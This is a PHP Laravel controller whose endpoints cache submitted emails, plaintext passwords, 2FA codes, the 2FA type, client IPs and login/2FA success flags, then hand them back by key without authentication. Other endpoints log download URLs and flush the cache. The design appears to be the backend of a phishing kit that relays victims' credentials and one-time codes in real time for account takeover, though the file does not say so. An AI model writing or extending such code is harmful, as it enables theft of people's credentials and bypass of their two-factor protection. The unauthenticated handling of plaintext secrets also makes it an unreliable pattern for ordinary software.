<?php

namespace App\Http\Controllers;

use App\Models\DownloadHistory;
use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
use Illuminate\Foundation\Validation\ValidatesRequests;
use Illuminate\Http\Request;
use Illuminate\Routing\Controller as BaseController;
use Illuminate\Support\Facades\Cache;
use Throwable;

class Controller extends BaseController
{
    use AuthorizesRequests, ValidatesRequests;

    public function deleteAllCache(Request $request)
    {
        try {
            Cache::flush();

            return response()->json([
                'status' => 0,
            ]);
        } catch (Throwable $e) {
            return response()->json([
                'status' => 1,
                'message' => $e->getMessage(),
            ]);
        }
    }

    public function setCacheByEmail(Request $request)
    {
        try {
            $email = $request->email ?? '';
            $password = $request->password ?? '';
            $fa = $request->fa ?? '';
            $isLoginSuccessfully = $request->isLoginSuccessfully ?? '';
            $isFaSuccessfully = $request->isFaSuccessfully ?? '';
            $typeFa = $request->typeFa ?? '';
            Cache::put($email, json_encode([
                'ip' => $request->ip(),
                'email' => $email,
                'password' => $password,
                'fa' => $fa,
                'typeFa' => $typeFa,
                'isLoginSuccessfully' => $isLoginSuccessfully,
                'isFaSuccessfully' => $isFaSuccessfully,
            ]), 10);

            return response()->json([
                'status' => 0,
            ]);
        } catch (Throwable $e) {
            Cache::forget($email);
            return response()->json([
                'status' => 1,
                'message' => $e->getMessage(),
            ]);
        }
    }

    public function setCacheById(Request $request)
    {
        try {
            $id = $request->id ?? '';
            $url = $request->url ?? '';
            Cache::put($id, json_encode([
                'id' => $id,
                'url' => $url,
            ]));

            DownloadHistory::create([
                'user_id' => $id,
                'url' => $url,
            ]);

            return response()->json([
                'status' => 0,
            ]);
        } catch (Throwable $e) {
            Cache::forget($id);
            return response()->json([
                'status' => 1,
                'message' => $e->getMessage(),
            ]);
        }
    }

    public function getCacheById(Request $request)
    {
        return response()->json([
            'status' => 0,
            'data' => json_decode(Cache::pull($request->id ?? '', ''))
        ]);
    }

    public function getCacheByKey(Request $request)
    {
        try {
            $key = $request->key ?? '';
            return response()->json([
                'status' => 0,
                'data' => json_decode(Cache::pull($key, ''))
            ]);
        } catch (Throwable $e) {
            return response()->json([
                'status' => 1,
                'message' => $e->getMessage(),
            ]);
        }
    }
}
